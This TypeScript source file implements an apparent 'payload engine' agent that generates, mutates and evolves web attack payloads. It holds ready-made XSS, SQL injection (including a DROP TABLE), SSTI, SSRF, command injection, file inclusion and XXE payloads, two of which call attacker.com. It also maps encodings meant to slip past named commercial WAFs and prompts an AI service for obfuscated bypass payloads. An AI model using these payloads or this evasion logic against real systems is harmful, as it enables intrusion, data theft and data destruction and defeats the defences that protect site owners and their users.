/**
 * Self-Learning Payload Engine Agent
 * Purpose: AI-powered payload generation and mutation
 * 
 * Features:
 * - Learn from successful exploits
 * - Mutate payloads based on WAF responses
 * - Context-aware payload generation
 * - Payload effectiveness tracking
 * - Auto-evolve bypass techniques
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import database from '../services/database';
import logger from '../utils/logger';
import ai from '../services/ai';
import { v4 as uuidv4 } from 'uuid';

interface PayloadEngineJob extends BaseJob {
  type: 'payload-engine';
  options: {
    programId: string;
    action: 'generate' | 'mutate' | 'learn' | 'evolve';
    payloadType: 'xss' | 'sqli' | 'ssti' | 'ssrf' | 'rce' | 'lfi' | 'xxe';
    context?: {
      wafDetected?: string;
      blockedPayloads?: string[];
      successfulPayloads?: string[];
      targetTechnology?: string;
    };
  };
}

interface Payload {
  id: string;
  type: string;
  payload: string;
  encoded: string[];
  effectiveness: number;
  bypasses: string[];
  context: string;
}

// Base payload templates by type
const BASE_PAYLOADS: Record<string, string[]> = {
  xss: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
  ],
  sqli: [
    "' OR '1'='1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "'; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "1' ORDER BY 1--",
  ],
  ssti: [
    '{{7*7}}',
    '${7*7}',
    '<%= 7*7 %>',
    '#{7*7}',
    '*{7*7}',
    '@(7*7)',
    '{{constructor.constructor("return this")()}}',
    '{{config.items()}}',
  ],
  ssrf: [
    'http://127.0.0.1',
    'http://localhost',
    'http://[::1]',
    'http://0.0.0.0',
    'http://169.254.169.254',
    'file:///etc/passwd',
    'dict://localhost:11211',
    'gopher://localhost:6379/_INFO',
  ],
  rce: [
    '; id',
    '| id',
    '`id`',
    '$(id)',
    '; cat /etc/passwd',
    '| cat /etc/passwd',
    '& whoami',
    '\n/bin/sh -c id',
  ],
  lfi: [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    '/etc/passwd%00',
    'php://filter/convert.base64-encode/resource=index.php',
    'file:///etc/passwd',
    '/proc/self/environ',
    '....\\....\\....\\windows\\win.ini',
    'php://input',
  ],
  xxe: [
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
  ],
};

// Encoding functions
const ENCODERS: Record<string, (s: string) => string> = {
  url: (s) => encodeURIComponent(s),
  doubleUrl: (s) => encodeURIComponent(encodeURIComponent(s)),
  html: (s) => s.split('').map(c => `&#${c.charCodeAt(0)};`).join(''),
  hex: (s) => s.split('').map(c => `\\x${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join(''),
  unicode: (s) => s.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join(''),
  base64: (s) => Buffer.from(s).toString('base64'),
  jsUnicode: (s) => s.split('').map(c => `\\u00${c.charCodeAt(0).toString(16).padStart(2, '0')}`).join(''),
};

export class PayloadEngineAgent extends BaseAgent<PayloadEngineJob> {
  private payloadHistory: Map<string, { success: number; fail: number }> = new Map();

  constructor() {
    super('payload-engine');
  }

  protected getSteps() {
    return [
      { name: 'Load payload history' },
      { name: 'Analyze context' },
      { name: 'Generate/mutate payloads' },
      { name: 'Apply encodings' },
      { name: 'Store and return' },
    ];
  }

  async process(job: Job<PayloadEngineJob>): Promise<any> {
    const { programId, options } = job.data;
    const { action, payloadType, context = {} } = options;

    await this.heartbeat();
    await this.updateJobStatus(job.id!, 'active');

    try {
      // Step 1: Load history
      await this.updateJobProgress(job.id!, {
        current: 1,
        total: 5,
        percentage: 10,
        currentTool: 'history-loader',
        toolStatus: 'running',
        message: 'Loading payload history',
      });

      await this.loadPayloadHistory(programId);

      // Step 2: Analyze context
      await this.updateJobProgress(job.id!, {
        current: 2,
        total: 5,
        percentage: 25,
        currentTool: 'context-analyzer',
        toolStatus: 'running',
        message: 'Analyzing target context',
      });

      const contextAnalysis = await this.analyzeContext(context);

      // Step 3: Generate/mutate payloads
      await this.updateJobProgress(job.id!, {
        current: 3,
        total: 5,
        percentage: 50,
        currentTool: 'payload-generator',
        toolStatus: 'running',
        message: `${action}ing payloads`,
      });

      let payloads: Payload[] = [];

      switch (action) {
        case 'generate':
          payloads = await this.generatePayloads(payloadType, contextAnalysis);
          break;
        case 'mutate':
          payloads = await this.mutatePayloads(payloadType, context.blockedPayloads || [], contextAnalysis);
          break;
        case 'learn':
          await this.learnFromResults(payloadType, context.successfulPayloads || [], context.blockedPayloads || []);
          payloads = await this.generatePayloads(payloadType, contextAnalysis);
          break;
        case 'evolve':
          payloads = await this.evolvePayloads(payloadType, contextAnalysis);
          break;
      }

      // Step 4: Apply encodings
      await this.updateJobProgress(job.id!, {
        current: 4,
        total: 5,
        percentage: 75,
        currentTool: 'encoder',
        toolStatus: 'running',
        message: 'Applying encodings',
      });

      payloads = this.applyEncodings(payloads, contextAnalysis);

      // Step 5: Store and return
      await this.updateJobProgress(job.id!, {
        current: 5,
        total: 5,
        percentage: 95,
        currentTool: 'storage',
        toolStatus: 'running',
        message: 'Storing payloads',
      });

      await this.storePayloads(programId, payloads);

      await this.updateJobProgress(job.id!, {
        current: 5,
        total: 5,
        percentage: 100,
        currentTool: 'complete',
        toolStatus: 'completed',
        message: `Generated ${payloads.length} payloads`,
      });

      const result = {
        action,
        payloadType,
        payloadCount: payloads.length,
        payloads: payloads.map(p => ({
          payload: p.payload,
          encoded: p.encoded,
          effectiveness: p.effectiveness,
        })),
      };

      await this.updateJobStatus(job.id!, 'completed', result);
      return result;

    } catch (error: any) {
      logger.error({ error, action }, 'Payload engine failed');
      await this.updateJobStatus(job.id!, 'failed', null, error.message);
      throw error;
    }
  }

  /**
   * Load payload effectiveness history
   */
  private async loadPayloadHistory(programId: string): Promise<void> {
    try {
      const result = await database.query(
        'SELECT payload_hash, success_count, fail_count FROM payload_history WHERE program_id = $1',
        [programId]
      );

      for (const row of result.rows) {
        this.payloadHistory.set(row.payload_hash, {
          success: row.success_count,
          fail: row.fail_count,
        });
      }
    } catch (error) {
      logger.debug({ error }, 'Failed to load payload history');
    }
  }

  /**
   * Analyze context for payload generation
   */
  private async analyzeContext(context: any): Promise<any> {
    return {
      waf: context.wafDetected || null,
      blockedPatterns: this.extractBlockedPatterns(context.blockedPayloads || []),
      technology: context.targetTechnology || null,
      recommendedEncodings: this.getRecommendedEncodings(context.wafDetected),
    };
  }

  /**
   * Extract patterns from blocked payloads
   */
  private extractBlockedPatterns(blockedPayloads: string[]): string[] {
    const patterns: Set<string> = new Set();

    for (const payload of blockedPayloads) {
      // Extract common blocked patterns
      if (payload.includes('<script')) patterns.add('<script');
      if (payload.includes('onerror')) patterns.add('onerror');
      if (payload.includes('onload')) patterns.add('onload');
      if (payload.includes('alert')) patterns.add('alert');
      if (payload.includes('SELECT')) patterns.add('SELECT');
      if (payload.includes('UNION')) patterns.add('UNION');
      if (payload.includes('../')) patterns.add('../');
    }

    return [...patterns];
  }

  /**
   * Get recommended encodings based on WAF
   */
  private getRecommendedEncodings(waf?: string): string[] {
    const wafEncodings: Record<string, string[]> = {
      'cloudflare': ['doubleUrl', 'unicode', 'html'],
      'akamai': ['hex', 'unicode', 'base64'],
      'imperva': ['doubleUrl', 'jsUnicode'],
      'modsecurity': ['url', 'html', 'hex'],
      'aws-waf': ['unicode', 'doubleUrl'],
    };

    return wafEncodings[waf?.toLowerCase() || ''] || ['url', 'html'];
  }

  /**
   * Generate payloads for a type
   */
  private async generatePayloads(type: string, context: any): Promise<Payload[]> {
    const basePayloads = BASE_PAYLOADS[type] || [];
    const payloads: Payload[] = [];

    for (const base of basePayloads) {
      // Skip if contains blocked patterns
      const isBlocked = context.blockedPatterns.some((p: string) => base.includes(p));
      if (isBlocked) continue;

      const effectiveness = this.calculateEffectiveness(base);

      payloads.push({
        id: uuidv4(),
        type,
        payload: base,
        encoded: [],
        effectiveness,
        bypasses: [],
        context: JSON.stringify(context),
      });
    }

    // Generate AI-enhanced payloads
    const aiPayloads = await this.generateAIPayloads(type, context);
    payloads.push(...aiPayloads);

    // Sort by effectiveness
    payloads.sort((a, b) => b.effectiveness - a.effectiveness);

    return payloads.slice(0, 50); // Limit to top 50
  }

  /**
   * Generate AI-enhanced payloads
   */
  private async generateAIPayloads(type: string, context: any): Promise<Payload[]> {
    const payloads: Payload[] = [];

    try {
      const prompt = `Generate 5 advanced ${type.toUpperCase()} payloads that bypass these patterns: ${context.blockedPatterns.join(', ')}
      
WAF detected: ${context.waf || 'unknown'}
Technology: ${context.technology || 'unknown'}

Requirements:
1. Avoid common blocked patterns
2. Use obfuscation techniques
3. Consider encoding bypasses
4. Be creative with syntax variations

Return JSON array: ["payload1", "payload2", ...]`;

      const response = await this.callAI(prompt);
      
      try {
        const aiPayloads = JSON.parse(response);
        for (const payload of aiPayloads) {
          payloads.push({
            id: uuidv4(),
            type,
            payload,
            encoded: [],
            effectiveness: 0.7, // AI payloads start with moderate effectiveness
            bypasses: ['ai-generated'],
            context: JSON.stringify(context),
          });
        }
      } catch {}
    } catch {}

    return payloads;
  }

  /**
   * Mutate blocked payloads
   */
  private async mutatePayloads(type: string, blockedPayloads: string[], context: any): Promise<Payload[]> {
    const payloads: Payload[] = [];

    const mutations = [
      // Case mutations
      (s: string) => s.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join(''),
      // Whitespace mutations
      (s: string) => s.replace(/ /g, '\t'),
      (s: string) => s.replace(/ /g, '/**/'),
      // Comment injection
      (s: string) => s.replace(/</g, '<\x00'),
      (s: string) => s.replace(/script/gi, 'scr\x00ipt'),
      // Null byte injection
      (s: string) => s + '\x00',
      // Double encoding prep
      (s: string) => s.replace(/'/g, '%27'),
    ];

    for (const blocked of blockedPayloads) {
      for (const mutate of mutations) {
        try {
          const mutated = mutate(blocked);
          if (mutated !== blocked) {
            payloads.push({
              id: uuidv4(),
              type,
              payload: mutated,
              encoded: [],
              effectiveness: 0.5,
              bypasses: ['mutation'],
              context: JSON.stringify(context),
            });
          }
        } catch {}
      }
    }

    return payloads;
  }

  /**
   * Learn from successful/failed payloads
   */
  private async learnFromResults(type: string, successful: string[], blocked: string[]): Promise<void> {
    // Update history
    for (const payload of successful) {
      const hash = this.hashPayload(payload);
      const current = this.payloadHistory.get(hash) || { success: 0, fail: 0 };
      current.success++;
      this.payloadHistory.set(hash, current);
    }

    for (const payload of blocked) {
      const hash = this.hashPayload(payload);
      const current = this.payloadHistory.get(hash) || { success: 0, fail: 0 };
      current.fail++;
      this.payloadHistory.set(hash, current);
    }

    logger.info({ type, successful: successful.length, blocked: blocked.length }, 'Learned from payload results');
  }

  /**
   * Evolve payloads using genetic algorithm approach
   */
  private async evolvePayloads(type: string, context: any): Promise<Payload[]> {
    const payloads: Payload[] = [];
    const basePayloads = BASE_PAYLOADS[type] || [];

    // Get top performing payloads
    const topPayloads = [...this.payloadHistory.entries()]
      .filter(([_, stats]) => stats.success > stats.fail)
      .sort((a, b) => (b[1].success / (b[1].success + b[1].fail)) - (a[1].success / (a[1].success + a[1].fail)))
      .slice(0, 10);

    // Crossover: combine parts of successful payloads
    for (let i = 0; i < topPayloads.length - 1; i++) {
      for (let j = i + 1; j < topPayloads.length; j++) {
        const p1 = basePayloads[i % basePayloads.length];
        const p2 = basePayloads[j % basePayloads.length];

        // Simple crossover
        const mid1 = Math.floor(p1.length / 2);
        const mid2 = Math.floor(p2.length / 2);
        const evolved = p1.substring(0, mid1) + p2.substring(mid2);

        payloads.push({
          id: uuidv4(),
          type,
          payload: evolved,
          encoded: [],
          effectiveness: 0.6,
          bypasses: ['evolved'],
          context: JSON.stringify(context),
        });
      }
    }

    return payloads;
  }

  /**
   * Apply various encodings to payloads
   */
  private applyEncodings(payloads: Payload[], context: any): Payload[] {
    const encodingsToApply = context.recommendedEncodings || ['url', 'html'];

    for (const payload of payloads) {
      const encoded: string[] = [];

      for (const encoding of encodingsToApply) {
        const encoder = ENCODERS[encoding];
        if (encoder) {
          try {
            encoded.push(encoder(payload.payload));
          } catch {}
        }
      }

      payload.encoded = encoded;
    }

    return payloads;
  }

  /**
   * Calculate payload effectiveness
   */
  private calculateEffectiveness(payload: string): number {
    const hash = this.hashPayload(payload);
    const history = this.payloadHistory.get(hash);

    if (history && (history.success + history.fail) > 0) {
      return history.success / (history.success + history.fail);
    }

    return 0.5; // Default effectiveness
  }

  /**
   * Hash payload for tracking
   */
  private hashPayload(payload: string): string {
    let hash = 0;
    for (let i = 0; i < payload.length; i++) {
      const char = payload.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return hash.toString(16);
  }

  /**
   * Store payloads in database
   */
  private async storePayloads(programId: string, payloads: Payload[]): Promise<void> {
    for (const payload of payloads) {
      try {
        await database.query(
          `INSERT INTO generated_payloads (id, program_id, type, payload, encoded, effectiveness, created_at)
           VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
           ON CONFLICT (id) DO NOTHING`,
          [payload.id, programId, payload.type, payload.payload, JSON.stringify(payload.encoded), payload.effectiveness]
        );
      } catch (error) {
        logger.debug({ error }, 'Failed to store payload');
      }
    }
  }

  /**
   * Call AI service
   */
  private async callAI(prompt: string): Promise<string> {
    try {
      const response = await (ai as any).generateText?.(prompt) ||
                       await (ai as any).chat?.([{ role: 'user', content: prompt }]) ||
                       '';
      return response;
    } catch {
      return '';
    }
  }
}

export default new PayloadEngineAgent();
